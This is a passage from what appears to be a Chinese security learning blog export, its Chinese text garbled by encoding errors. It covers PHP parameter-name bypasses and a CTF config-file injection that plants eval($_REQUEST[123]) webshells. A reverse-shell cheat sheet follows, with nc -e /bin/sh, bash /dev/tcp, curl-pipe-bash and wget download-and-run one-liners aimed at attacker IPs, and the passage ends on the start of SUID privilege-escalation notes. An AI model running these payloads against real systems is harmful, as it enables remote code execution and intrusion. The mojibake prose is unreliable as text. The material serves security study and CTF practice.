<p>å‘ç°åœ¨ä½ç‰ˆæœ¬ä¸‹å¦‚æœåœ¨ç›®å½•æ‰§è¡Œçš„ç›®å½•ä¸‹æœ‰<code>index.php</code>ï¼Œä¹Ÿæ— æ³•è¿›è¡Œä»»æ„æ–‡ä»¶å†…å®¹çš„è¯»å–</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote>
<p>æƒ³è¦å®ç°phpå†…ç½®æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé¦–å…ˆæ˜¯è¦æ»¡è¶³ç‰ˆæœ¬è¦æ±‚ï¼Œå…¶æ¬¡éœ€è¦æ»¡è¶³ï¼Œå¯¹æ–¹æ‰§è¡Œæ­å»ºå†…ç½®æœåŠ¡å™¨çš„ç›®å½•ä¸‹æ²¡æœ‰index.phpæ–‡ä»¶ï¼Œæ‰å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†…å®¹çš„ä¸€ä¸ªè¯»å–ï¼Œä¸è¿‡ä¸€èˆ¬çš„å¼€å‘è€…éƒ½ä¸ä¼šæŠŠphpå†…ç½®æœåŠ¡å™¨æ­å»ºçš„ç½‘ç«™æŒ‚åœ¨å…¬ç½‘ä¸Šï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´ä¹Ÿæ˜¯ä¸€ä¸ªå€¼å¾—è€ƒè™‘çš„ä¸€ä¸ªåˆ©ç”¨ç‚¹</p>
</blockquote>
<h1 id="php-8éæ³•å‚æ•°åä¼ å‚"><a href="#php-8éæ³•å‚æ•°åä¼ å‚" class="headerlink" title="php &lt; 8éæ³•å‚æ•°åä¼ å‚"></a>php &lt; 8éæ³•å‚æ•°åä¼ å‚</h1><p>å½“ä¼ å‚<code>$_REQUEST[&#39;mo chu.&#39;]</code></p>
<p>å‚æ•°åä¸­å«æœ‰<code>ç©ºæ ¼</code>å’Œ<code>ç‚¹</code>ï¼Œå¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ä¼ å…¥<code>?mo chu. =xxx</code>æ—¶ï¼Œä¼ å…¥çš„å‚æ•°åä¸­ç‚¹<code>.</code>å’Œ<code>ç©ºæ ¼</code>éƒ½è¢«æ›¿æ¢ä¸ºäº†ä¸‹åˆ’çº¿<code>_</code>ï¼Œè¿™æ ·çš„å‚æ•°åç¡®å®æ— æ³•ä¼ å‚ã€‚</p>
<p>å½“<code>PHPç‰ˆæœ¬å°äº8</code>æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·<code>[</code>ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰<code>éæ³•å­—ç¬¦</code>å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸­æ‹¬å·<code>[</code>å‡ºç°åœ¨å‰é¢ï¼Œé‚£ä¹ˆä¸­æ‹¬å·<code>[</code>è¿˜æ˜¯ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯å› ä¸ºå‡ºé”™å¯¼è‡´æ¥ä¸‹æ¥çš„éæ³•å­—ç¬¦å¹¶ä¸ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ã€‚</p>
<p>Payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?mo[chu.<span class="number">7</span>=xxx</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨äº†å¦‚æœä¼ å…¥çš„å‚æ•°åå‡ºç°äº†ä¸­æ‹¬å·<code>[</code>åªæ›¿æ¢ä¸€æ¬¡çš„åŸç†ï¼Œä½¿å¾—ä¼ å…¥çš„å‚æ•°ä¸ºï¼š<code>mo_chu.7</code></p>
<p>ä½†æ˜¯å¦‚æœå‡ºç°äº†å¤šä¸ª <code>[</code>ï¼Œå°±æ— æ³•æ›¿æ¢äº†</p>
<p>åœ¨PHP8ä¸­è¿™ç§è½¬æ¢é”™è¯¯è¢«ä¿®å¤äº†ï¼Œä¼ å…¥çš„å‚æ•°åä¸­éæ³•å­—ç¬¦ä¸€å¾‹å…¨éƒ¨è½¬æ¢ä¸ºäº†ä¸‹åˆ’çº¿</p>
<h1 id="PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´"><a href="#PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´" class="headerlink" title="PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´"></a>PHPå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´</h1><p>åœ¨ä¸€ä¸ªæ¯”èµ›ä¸­äº†è§£åˆ°çš„ä¸€ä¸ªæ¼æ´ï¼Œå…³é”®åœ¨äºç»•è¿‡å‡½æ•°ä»è€ŒåŒ…å«</p>
<p><a href="https://bbs.zkaq.cn/t/6045.html">è½¬è½½æ–‡ç« </a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>


<p><code>config.php</code> çš„å†…å®¹å¦‚ä¸‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚æ˜¯è¦<code>getshell</code>,è¿™ä¸ªåœºæ™¯ååˆ†ç»å…¸ï¼Œå¸¸ç”¨åœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶å†™å…¥çš„æ—¶å€™ã€‚<br>æ­¤å¤„ä¸å­˜åœ¨ä¹‹å‰è¯´çš„é‚£ä¸ªé…ç½®æ–‡ä»¶ä¸­ç”¨çš„æ˜¯<code>â€åŒå¼•å·â€</code>å¼•èµ·ä»»æ„ä»£ç æ‰§è¡Œçš„é—®é¢˜,è¿™è¿™é‡Œé¢ç”¨çš„æ˜¯å•å¼•å·,è€Œä¸” <code>addslashes()</code>å¤„ç†è¿‡äº†,çœ‹ä¼¼å¾ˆå®‰å…¨,ä½†æ˜¯å¯¹äºè„‘å­é‡Œæœ‰ä¸ªé»‘æ´çš„æå®‰å…¨çš„äººæ¥è®²,è¿™ä¸ªè¿˜çœŸæ˜¯æœ‰é—®é¢˜çš„.</p>
<h2 id="æ–¹æ³•ä¸€-åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•ä¸€,åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜"></a>æ–¹æ³•ä¸€,åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜</h2><p>å¯ä»¥çœ‹åˆ°æ­£åˆ™åŒ¹é…çš„æ˜¯ä»¥ä¸‹å†…å®¹:</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;ä»»æ„å†…å®¹&#x27;</span></span><br></pre></td></tr></table></figure>


<p>ä»»æ„å†…å®¹é‡Œé¢æ˜¯å¯ä»¥åŒ…å«è½¬ç§»ç¬¦ <code>\</code> çš„,æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œå®Œç¬¬ä¸€ä¸ªä¹‹å,<code>config.php</code>ä¸­çš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™æ ·å¹¶æ²¡æœ‰åŠæ³•æ‰§è¡Œ<code>phpinfo()</code>,å› ä¸ºæˆ‘ä»¬æ’å…¥çš„ å•å¼•å· è¢«è½¬ç§»æ‰äº†,æ‰€ä»¥<code>phpinfo()</code>è¿˜æ˜¯åœ¨å•å¼•å·çš„åŒ…è£¹ä¹‹å†….<br>æˆ‘ä»¬åœ¨è®¿é—®ä¸‹é¢è¿™ä¸ª</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>å› ä¸ºæ­£åˆ™ <code>.*</code> ä¼šåŒ¹é…è¡Œå†…çš„ä»»æ„å­—ç¬¦æ— æ•°æ¬¡.æ‰€ä»¥ <code>\</code> ä¹Ÿè¢«è®¤ä¸ºæ˜¯å…¶ä¸­çš„ä¸€éƒ¨åˆ†,ä¹Ÿä¼šè¢«æ›¿æ¢æ‰,æ‰§è¡Œå®Œä¹‹å,<code>config.php</code>ä¸­çš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>


<p>è½¬ä¹‰ç¬¦å°±è¢«æ›¿æ¢æ‰äº†,å°±æˆåŠŸçš„<code>getshell</code>.</p>
<h2 id="æ–¹æ³•äºŒ-åˆ©ç”¨-preg-replaceå‡½æ•°çš„é—®é¢˜"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨-preg-replaceå‡½æ•°çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•äºŒ,åˆ©ç”¨ preg_replaceå‡½æ•°çš„é—®é¢˜:"></a>æ–¹æ³•äºŒ,åˆ©ç”¨ preg_replaceå‡½æ•°çš„é—®é¢˜:</h2><p>ç”¨<code>preg_replace()</code>çš„æ—¶å€™<code>replacement(ç¬¬äºŒä¸ªå‚æ•°)</code>ä¹Ÿè¦ç»è¿‡æ­£åˆ™å¼•æ“å¤„ç†ï¼Œæ‰€ä»¥æ­£åˆ™å¼•æ“æŠŠ<code>\\</code>è½¬ä¹‰æˆäº†<code>\</code><br>ä¹Ÿå°±æ˜¯è¯´å¦‚æœå­—ç¬¦ä¸²æ˜¯<code>\\\&amp;#39;</code>,ç»è¿‡ <code>preg_replace()</code>çš„å¤„ç†,å°±å˜ä¸º <code>#39;</code>,å•å¼•å·å°±é€ƒå‡ºæ¥äº†.<br>æ‰€ä»¥<code>payload</code>å¦‚ä¸‹:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span>/</span><br></pre></td></tr></table></figure>


<p><code>config.php</code>å˜ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>**é“ç†å°±æ˜¯  <code>a\&amp;#39;;phpinfo();//</code>  ç»è¿‡ <code>addslashes()</code>å¤„ç†ä¹‹å,å˜ä¸º<code>a\\\&amp;#39;;phpinfo();//</code> ç„¶åä¸¤ä¸ªåæ–œæ è¢«<code>preg_replace</code>å˜æˆäº†ä¸€ä¸ª,å¯¼è‡´å•å¼•å·é€ƒè„±.</p>
<h2 id="æ–¹æ³•ä¸‰-åˆ©ç”¨-preg-replace-å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜"><a href="#æ–¹æ³•ä¸‰-åˆ©ç”¨-preg-replace-å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•ä¸‰, åˆ©ç”¨ preg_replace() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜"></a>æ–¹æ³•ä¸‰, åˆ©ç”¨ preg_replace() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜</h2><p>å…ˆçœ‹å®˜æ–¹å¯¹<code>preg_replace()</code>å‡½æ•°çš„æè¿°<code>manual</code><br>å‡½æ•°åŸå‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>


<p>å¯¹<code>replacement</code>çš„æè¿°.<br><code>replacement</code>ä¸­å¯ä»¥åŒ…å«å</p>
<p>å‘<code>å¼•ç”¨\\næˆ–(php 4.0.4ä»¥ä¸Šå¯ç”¨)$n</code>ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ª è¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬<code>n</code>ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ <code>n</code> å¯ä»¥æ˜¯<code>0-99</code>ï¼Œ<code>\\0</code>å’Œ<code>$0</code>ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= æˆ–è€… http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œç¬¬ä¸€æ¡å<code>config.php</code>çš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>å†æ‰§è¡Œç¬¬äºŒæ¡å<code>config.php</code>çš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>åˆšå¥½é—­åˆæ‰äº†å‰åçš„ä¸¤ä¸ªå•å¼•å·ä¸­é—´çš„é€ƒè„±å‡ºæ¥äº†.æƒ³å‡ºè¿™ä¸ªåŠæ³•çš„äºº,æ€è·¯çœŸæ˜¯å¯ä»¥çš„.</p>
<hr>
<p>è¦<code>getshell</code>ç›´æ¥</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">æŠŠ<span class="built_in">phpinfo</span>()æ›¿æ¢æˆ</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">èšå‰‘è¿æ¥å³å¯</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>daily</tag>
      </tags>
  </entry>
  <entry>
    <title>åå¼¹shell</title>
    <url>//post/Reverses-shell/</url>
    <content><![CDATA[<p><code>ç›‘å¬ï¼Œå¼¹å¼¹å¼¹</code></p>
<span id="more"></span>

<h1 id="åå¼¹shellå§¿åŠ¿"><a href="#åå¼¹shellå§¿åŠ¿" class="headerlink" title="åå¼¹shellå§¿åŠ¿"></a>åå¼¹shellå§¿åŠ¿</h1><h2 id="netcat-ä¸€å¥è¯åå¼¹"><a href="#netcat-ä¸€å¥è¯åå¼¹" class="headerlink" title="netcat ä¸€å¥è¯åå¼¹"></a>netcat ä¸€å¥è¯åå¼¹</h2><p>è·å–<code>shell</code>ï¼ˆæƒ³åå¼¹è°çš„<code>shell</code>å°±åœ¨è°çš„åé¢åŠ <code>-e /bin/sh</code>æˆ–<code>-e /bin/bash</code>ï¼‰</p>
<h3 id="æ­£å‘shell"><a href="#æ­£å‘shell" class="headerlink" title="æ­£å‘shell"></a>æ­£å‘<code>shell</code></h3><p> å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥æœåŠ¡å™¨å¹¶è·å–æœåŠ¡å™¨shell</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥å¹¶å¾—åˆ°åå¼¹shell</span>    </span><br><span class="line">    <span class="string">nc</span> <span class="string">æœåŠ¡ç«¯ip</span> <span class="number">8888</span></span><br><span class="line"><span class="string">æœåŠ¡ç«¯ç›‘å¬è¿æ¥</span></span><br><span class="line">    <span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line">    <span class="comment"># windowsä¸Šï¼šnc -lvp 8888 -e c:\windows\system32\cmd.exe </span></span><br></pre></td></tr></table></figure>

<h3 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘<code>shell</code></h3><p>æœåŠ¡å™¨ç«¯è¿æ¥å¹¶åå¼¹<code>shell</code>ç»™å®¢æˆ·ç«¯</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">å®¢æˆ·ç«¯ç›‘å¬</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> </span><br><span class="line"><span class="string">æœåŠ¡ç«¯è¿æ¥å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="string">nc</span> <span class="string">å®¢æˆ·ç«¯ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line"></span><br><span class="line"><span class="string">windowsä¸Šï¼šnc</span> <span class="string">ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">c:\windows\system32\cmd.exe</span></span><br></pre></td></tr></table></figure>

<h2 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a>bashåå¼¹shell</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/æˆ‘ä»¬é¶æœºip/æˆ‘ä»¬é¶æœº port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>bash</code>ä¸€å¥è¯å‘½ä»¤è¯¦è§£<br>ä»¥ä¸‹é’ˆå¯¹å¸¸ç”¨çš„<code>bash</code>åå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹</p>
<p><img src="/post/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></p>
<blockquote>
<p>å…¶å®ä»¥ä¸Šbashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼š<br>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒä¸æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº<code>8080</code>ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ª<code>tcp 8080</code>ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbashåå¼¹ç¯å¢ƒã€‚</p>
</blockquote>
<p>åœ¨åå¼¹<code>shell</code>æ—¶è¦å€ŸåŠ©<code>netcat</code>å·¥å…·åå¼¹</p>
<h2 id="curlåå¼¹shell"><a href="#curlåå¼¹shell" class="headerlink" title="curlåå¼¹shell"></a>curlåå¼¹shell</h2><p>å‰æè¦åˆ©ç”¨<code>bash</code>ä¸€å¥è¯çš„æƒ…å†µä¸‹ä½¿ç”¨<code>curl</code>åå¼¹<code>shell</code></p>
<p>åœ¨å­˜åœ¨<code>å‘½ä»¤æ‰§è¡Œ</code>çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">curl [è‡ªå·±çš„æœåŠ¡å™¨]ip<span class="string">|bash</span></span><br><span class="line"><span class="comment">//åœ¨åˆ©ç”¨curlé‡Œæ‰§è¡Œæˆ‘è‡ªå·±çš„æœåŠ¡å™¨ä¸Šçš„bashä¸€å¥è¯</span></span><br></pre></td></tr></table></figure>

<p>è¯¥<code>ip</code>çš„<code>index</code>æ–‡ä»¶ä¸Šå«æœ‰<code>bash</code>ä¸€å¥è¯ï¼Œå°±å¯ä»¥åå¼¹<code>shell</code>ã€‚</p>
<p>ä¾‹å¦‚åœ¨è‡ªå·±çš„æœåŠ¡å™¨<code>indexæ–‡ä»¶</code>ä¸Šå†™ä¸Šä¸€å¥è¯</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.20.151</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p> <code>192.168.20.151</code>å°±æ˜¯ä½œä¸ºç›‘å¬ç«¯å£çš„æœåŠ¡å™¨ã€æ”»å‡»æœºã€‘ç”¨æ¥å¾—åˆ°åå¼¹çš„shellã€‚</p>
<p><img src="/post/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></p>
<p> å­˜åœ¨ä¸€å¥è¯ï¼Œåˆ©ç”¨<code>curl</code>åå¼¹ã€‚<br><code>kali</code>å¼€å¯ç›‘å¬</p>
<p><img src="/post/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></p>
<h2 id="wgetæ–¹å¼åå¼¹shell"><a href="#wgetæ–¹å¼åå¼¹shell" class="headerlink" title="wgetæ–¹å¼åå¼¹shell"></a><code>wget</code>æ–¹å¼åå¼¹<code>shell</code></h2><p>åˆ©ç”¨<code>wget</code>è¿›è¡Œä¸‹è½½æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¸‹é¢è´´å‡ºçš„<code>php</code>è¿›è¡Œåå¼¹ã€‚<br>å¼€å¯ç›‘å¬</p>
<p> <img src="/post/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxç‰¹æ®Šæƒé™ä½</title>
    <url>//post/Linux-PowerUp/</url>
    <content><![CDATA[<p><code>linuxææƒå­¦ä¹ </code></p>
<span id="more"></span>

<h1 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">å‚è€ƒæ–‡ç« </a></p>
<h2 id="1ï¼‰åˆ©ç”¨SUIDææƒ"><a href="#1ï¼‰åˆ©ç”¨SUIDææƒ" class="headerlink" title="1ï¼‰åˆ©ç”¨SUIDææƒ"></a>1ï¼‰åˆ©ç”¨SUIDææƒ</h2><h3 id="ä»€ä¹ˆæ˜¯suidï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯suidï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯suidï¼Ÿ"></a>ä»€ä¹ˆæ˜¯suidï¼Ÿ</h3><blockquote>
<p>Set User IDçš„ä¸€ç§æƒé™ç±»å‹ï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨æŒ‡å®šçš„ç”¨æˆ·æƒé™æ‰§è¡Œæ–‡ä»¶ã€‚é‚£äº›å…·ç”¨suidæƒé™çš„æ–‡ä»¶ä»¥æœ€é«˜çš„æƒé™è¿è¡Œã€‚å‡è®¾æˆ‘ä»¬ä»¥érootç”¨æˆ·èº«ä»½è®¿é—®ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”æˆ‘ä»¬å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶å¯ç”¨äº†suidä½ï¼Œé‚£ä¹ˆ<br>è¿™äº›æ–‡ä»¶&#x2F;ç¨‹åº&#x2F;å‘½ä»¤å¯ä»¥ä»¥rootæƒé™è¿è¡Œ</p>
<p>SUIDçš„ç›®çš„å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®ä»–æ²¡æœ‰æƒé™çš„èµ„æº</p>
</blockquote>
<h3 id="ä»€ä¹ˆæ˜¯SGID"><a href="#ä»€ä¹ˆæ˜¯SGID" class="headerlink" title="ä»€ä¹ˆæ˜¯SGID"></a>ä»€ä¹ˆæ˜¯SGID</h3><blockquote>
<p>Gçš„æ„æ€å°±æ˜¯<code>group</code>ï¼ŒåŠŸèƒ½å’Œ<code>suid</code>åŸºæœ¬ä¸ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯<code>suid</code>è·å¾—å‘½ä»¤æ‰€å±ç”¨æˆ·çš„èº«ä»½å’Œæƒé™ï¼Œè€Œ<code>sgid</code>æ˜¯è·å–æ‰€å±ç”¨æˆ·ç»„çš„èº«ä»½å’Œæƒé™</p>
</blockquote>
<h3 id="SUIDæƒé™"><a href="#SUIDæƒé™" class="headerlink" title="SUIDæƒé™"></a>SUIDæƒé™</h3><blockquote>
<p>1ï¼ŒSUIDæƒé™åªèƒ½è®¾ç½®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<p>2ï¼Œå‘½ä»¤æ‰§è¡Œè€…è¦æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰§è¡Œæƒã€‚</p>
<p>3ï¼Œå‘½ä»¤æ‰§è¡Œè€…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä¼šè·å¾—è¯¥ç¨‹åºçš„å±ä¸»èº«ä»½ã€‚</p>
<p>4ï¼ŒSUIDæƒé™åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆã€‚</p>
